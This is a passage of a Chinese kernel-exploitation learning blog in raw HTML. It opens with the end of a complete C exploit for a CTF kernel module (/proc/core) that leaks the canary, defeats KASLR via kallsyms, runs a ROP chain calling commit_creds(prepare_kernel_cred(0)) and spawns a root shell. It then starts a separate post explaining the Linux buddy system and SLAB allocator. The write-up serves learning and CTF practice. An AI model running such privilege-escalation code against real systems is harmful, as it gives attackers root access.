class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq = <span class="number">0xFFFFFFFF81A00987</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;	<span class="comment">// file pointer of process &#x27;core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function is used to get the addresses of two key functions from /tmp/kallsyms</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>&#123;</span><br><span class="line">	FILE* sym_table = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);	<span class="comment">// including all address of kernel functions</span></span><br><span class="line">	<span class="keyword">if</span>(sym_table == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">char</span> func_name[<span class="number">0x100</span>];</span><br><span class="line">	<span class="comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;</span><br><span class="line">		<span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)		<span class="comment">// two addresses of key functions are all found, return directly.</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;commit_creds&quot;</span>))&#123;		<span class="comment">// function &quot;commit_creds&quot; found</span></span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;prepare_kernel_cred&quot;</span>))&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">		<span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">		<span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">		<span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">		output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">				<span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">		<span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">		index += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	saveStatus();</span><br><span class="line">	fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);		<span class="comment">// open the process</span></span><br><span class="line">	<span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	get_function_address();		<span class="comment">// get addresses of two key function</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base_offset = commit_creds - commit_creds_base;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n&quot;</span>, base_offset);</span><br><span class="line">	</span><br><span class="line">	change_off(<span class="number">0x40</span>);			<span class="comment">// change the offset so that we can get canary later</span></span><br><span class="line">	core_read(buffer);			<span class="comment">// get canary</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Contents in buffer here:\033[0m\n&quot;</span>);	<span class="comment">// print content in buffer</span></span><br><span class="line">	print_binary(buffer, <span class="number">0x40</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary = ((<span class="type">size_t</span>*)&amp;buffer)[<span class="number">0</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n&quot;</span>, canary);</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> ROP[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">memset</span>(ROP, <span class="number">0</span>, <span class="number">800</span>);</span><br><span class="line">	<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">		ROP[idx++] = canary;</span><br><span class="line">	ROP[idx++] = poprdi_ret + base_offset;</span><br><span class="line">	ROP[idx++] = <span class="number">0</span>;			<span class="comment">// rdi -&gt; 0</span></span><br><span class="line">	ROP[idx++] = prepare_kernel_cred;</span><br><span class="line">	ROP[idx++] = poprdx_ret + base_offset;</span><br><span class="line">	ROP[idx++] = poprcx_ret + base_offset;</span><br><span class="line">	ROP[idx++] = movrdirax_callrdx + base_offset;</span><br><span class="line">	ROP[idx++] = commit_creds;</span><br><span class="line">	ROP[idx++] = swapgs_popfq_ret + base_offset;	<span class="comment">// step 1 of returning to user mode: swapgs</span></span><br><span class="line">	ROP[idx++] = <span class="number">0</span>;</span><br><span class="line">	ROP[idx++] = iretq + base_offset;				<span class="comment">// step 2 of returning to user mode: iretq</span></span><br><span class="line">	<span class="comment">// after the iretq: return address, user cs, user rflags, user sp, user ss</span></span><br><span class="line">	ROP[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">	ROP[idx++] = user_cs;</span><br><span class="line">	ROP[idx++] = user_rflags;</span><br><span class="line">	ROP[idx++] = user_sp;</span><br><span class="line">	ROP[idx++] = user_ss;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n&quot;</span>);</span><br><span class="line">	print_binary((<span class="type">char</span>*)ROP, <span class="number">0x100</span>);</span><br><span class="line">	</span><br><span class="line">	write(fd, ROP, <span class="number">0x800</span>);</span><br><span class="line">	core_copy_func(<span class="number">0xffffffffffff1000</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译时注意加上静态编译<code>--static</code>和<code>-masm=intel</code>选项。<a target="_blank" rel="noopener" href="http://xn--start-pq7hz5d6y8c0o5eyyp.sh">打包后运行start.sh</a>，如果出现内核恐慌，则将分配的内存增加一倍再进行尝试。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/" class="post-title-link" itemprop="url">Kernel pwn 入门 (8)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:41 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:41+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本篇文章中笔者不打算分析题目，而是对Linux中的slub系统进行深入的学习与分析。</p>
<p>参考资料：上一篇文章中提到的三篇与kernel内存分配有关的文章。在阅读本文时，建议与这三篇文章对照食用。</p>
<h1 id="1-伙伴系统重温"><a class="markdownIt-Anchor" href="#1-伙伴系统重温"></a> 1. 伙伴系统重温</h1>
<p>slub作为小块内存的分配器，其在伙伴系统之下运作，因此首先我们还是来回顾一下伙伴系统。</p>
<p>在第4篇文章中，我们简单介绍了伙伴系统的运作机理，以页为单位进行大块内存空间的分配与释放。其具体的数据结构如下图所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 伙伴系统的一个块，描述1,2,4,8,16,32,64,128,256,512或1024个连续页框的块 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 指向这个块中所有空闲小块的第一个页描述符，这些小块会按照MIGRATE_TYPES类型存放在不同指针里 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="comment">/* 空闲小块的个数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><font color=red><strong>需要注意的是，伙伴系统并不是内核内存分配系统中最上层的结构，在其上还有其他的结构，但在Kernel pwn中我们对更为上层的结构接触较少，因此这里只介绍到伙伴系统。</strong></font></p>
<p>上图的<code>free_area</code>表示一系列页的链表的数组。而在Linux系统内核中，一共有11个这样的<code>free_area</code>，分别保存所有大小为1,2,4,8,16,32,64,128,256,512,1024个页大小的内存空间（这些空间都是连续的），在<code>free_area</code>中，<code>free_list</code>是一系列这样的内存空间组成的链表的数组，内含多个链表，这些链表中的内存空间大小相同，但属性不同，对于<code>MIGRATE_TYPES</code>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">	MIGRATE_UNMOVABLE,</span><br><span class="line">	MIGRATE_MOVABLE,</span><br><span class="line">	MIGRATE_RECLAIMABLE,</span><br><span class="line">	MIGRATE_PCPTYPES,	<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">	MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">	 * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">	 * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">	 * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">	 * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">	 * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	MIGRATE_ISOLATE,	<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里定义了链表中内存块的属性：</p>
<blockquote>
<p>linux为了防止内存中产生过多的碎片，一般把页的类型分为三种：<br />
不可移动页：在内存中有固定位置，不能移动到其他地方。内核中使用的页大部分是属于这种类型。<br />
可回收页：不能直接移动，但可以删除，页中的内容可以从某些源中重新生成。例如，页内容是映射到文件数据的页就属于这种类型。对于这种类型，在内存短缺(分配失败)时，会发起内存回收，将这类型页进行回写释放。<br />
可移动页：可随意移动，用户空间的进程使用的没有映射具体磁盘文件的页就属于这种类型(比如堆、栈、shmem共享内存、匿名mmap共享内存)，它们是通过进程页表映射的，把这些页复制到新位置时，只要更新进程页表就可以了。一般这些页是从高端内存管理区获取。</p>
</blockquote>
<p>上面的每一个链表中保存的所有内存块的属性都是一样的。因此总的来看，伙伴系统可以表示为下图所示的结构：</p>
<p><img src="https://img-blog.csdnimg.cn/a2449f904a104a21b31956db5e72003c.png" alt="" /><br />
其中枚举类型具体的含义我们只需要了解即可，在Kernel pwn中我们应该应对的最多的还是SLAB和SLUB系统。虽然SLAB系统正逐渐被SLUB替换，但还是有必要进行了解。</p>
<h1 id="2-slab系统介绍"><a class="markdownIt-Anchor" href="#2-slab系统介绍"></a> 2. SLAB系统介绍</h1>
<p>SLAB分配器建立在伙伴系统基础上，由于参考资料年代较为久远，部分源码与最近的Linux内核源码差距较大，因此不做解释，但影响不大。</p>
<p>在SLAB中，我们将可分配的内存块称之为<font color=red><strong>对象</strong></font>，一个分配器由结构体<code>kmem_cache</code>描述，结构如下（选自Linux 5.18.19版本内核）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> __<span class="title">percpu</span> *<span class="title">cpu_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1) Cache tunables. Protected by slab_mutex */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> batchcount;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_buffer_size</span>;</span></span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;		<span class="comment">/* constant flags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> num;		<span class="comment">/* # of objs per slab */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line">	<span class="comment">/* order of pgs per slab (2^n) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> gfporder;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* force GFP flags, e.g. GFP_DMA */</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> colour;			<span class="comment">/* cache colouring range */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> colour_off;	<span class="comment">/* colour offset */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">freelist_cache</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> freelist_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* constructor func */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="type">int</span> refcount;</span><br><span class="line">	<span class="type">int</span> object_size;</span><br><span class="line">	<span class="type">int</span> align;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> num_allocations;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> high_mark;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> grown;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> reaped;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> errors;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> max_freeable;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_allocs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_frees;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_overflow;</span><br><span class="line">	<span class="type">atomic_t</span> allochit;</span><br><span class="line">	<span class="type">atomic_t</span> allocmiss;</span><br><span class="line">	<span class="type">atomic_t</span> freehit;</span><br><span class="line">	<span class="type">atomic_t</span> freemiss;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If debugging is enabled, then the allocator can add additional</span></span><br><span class="line"><span class="comment">	 * fields and/or padding to every object. &#x27;size&#x27; contains the total</span></span><br><span class="line"><span class="comment">	 * object size including these internal fields, while &#x27;obj_offset&#x27;</span></span><br><span class="line"><span class="comment">	 * and &#x27;object_size&#x27; contain the offset to the user object and its</span></span><br><span class="line"><span class="comment">	 * size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>kmem_cache_node *node[MAX_NUMNODES]</code>中就保存有SLAB分配器中的一些核心结构，这里的<code>MAX_NUMNODES</code>在x86-64架构下的值为64：</p>
